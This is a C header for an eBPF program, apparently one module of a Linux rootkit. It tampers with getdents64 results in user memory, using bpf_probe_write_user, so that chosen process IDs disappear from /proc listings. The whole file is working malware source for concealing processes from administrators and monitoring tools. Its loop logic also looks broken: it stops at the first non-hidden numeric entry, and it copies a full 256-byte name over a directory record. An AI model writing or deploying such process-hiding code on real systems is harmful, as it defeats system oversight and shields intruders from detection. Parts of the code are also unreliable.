#ifndef MOD_HIDE_PROC_H
#define MOD_HIDE_PROC_H

#include "../includes/bpf.h"
#include "../includes/config.h"
#include "../includes/utils.h"

/**
 * Hide pid from a white list.
 */
static __always_inline int attach_proc_hide(long ret){
    __u64 key = bpf_get_current_pid_tgid();

    /**
     * Lookup returns ptr to our linux_dirent64 ptr stored in our map | cache.
     */
    struct linux_dirent64 **map_val = bpf_map_lookup_elem(&getdents64_cache, &key);
    if(!map_val)
        return 0;

    struct linux_dirent64 *dirent = *map_val;

    //cleanup.
    bpf_map_delete_elem(&getdents64_cache, &key);

    if(ret <= 0)
        return 0;

    //loop through
    struct linux_dirent64 *prev = NULL;
    unsigned short prev_reclen  = 0;

    long bpos = 0;

    #pragma unroll
    for(int i = 0; i < MAX_ENTRIES; i++) {

        //num entries returned.
        if(bpos >= ret)
            break;

        //calc entry offset
        struct linux_dirent64 *d = (void*)dirent + bpos;

        unsigned short reclen = 0;
        if (bpf_probe_read_user(&reclen, sizeof(reclen), &d->d_reclen))
            break;

        if (reclen == 0)
            break;

        char name[256] = {0};
        long read_name = bpf_probe_read_user_str(name, sizeof(name), d->d_name);
        if (read_name < 0)
            return 0;

        //start checks.
        if(ft_isnumeric(name)) {
            
            //exist ?
            __u32 pid = (__u32)ft_atoi(name);
            __u8 *map_pid = bpf_map_lookup_elem(&whitelist_pid, &pid);

            if(!map_pid || *map_pid != 1)
                break; 
            //--------------------------------------------------------


            //case 1 => target is not first entry.
            if(prev != NULL) {
                unsigned short new_reclen = prev_reclen + reclen;
                bpf_probe_write_user(&prev->d_reclen, &new_reclen, sizeof(new_reclen));
            }

            //case 2 : target is first entry.
            else {
                struct linux_dirent64 *next = (void *)d + reclen;
 
                // check next value exists.
                if (bpos + reclen < ret) {
                    __u64 next_ino                  = 0;
                    __s64 next_off                  = 0;
                    unsigned short next_reclen      = 0;
                    unsigned char  next_type        = 0;
                    char next_name[256]             = {0};
 
                    bpf_probe_read_user(&next_ino,     sizeof(next_ino),    &next->d_ino);
                    bpf_probe_read_user(&next_off,     sizeof(next_off),    &next->d_off);
                    bpf_probe_read_user(&next_reclen,  sizeof(next_reclen), &next->d_reclen);
                    bpf_probe_read_user(&next_type,    sizeof(next_type),   &next->d_type);
                    bpf_probe_read_user_str(next_name, sizeof(next_name),  next->d_name);
 
                    bpf_probe_write_user(&d->d_ino,    &next_ino,    sizeof(next_ino));
                    bpf_probe_write_user(&d->d_off,    &next_off,    sizeof(next_off));
                    bpf_probe_write_user(&d->d_reclen, &next_reclen, sizeof(next_reclen));
                    bpf_probe_write_user(&d->d_type,   &next_type,   sizeof(next_type));
                    bpf_probe_write_user(d->d_name,    next_name,    sizeof(next_name));
                }
            }

            break;
        }

        prev = d;
        prev_reclen = reclen;
        bpos += reclen;
    }
    
    return 0;
}

#endif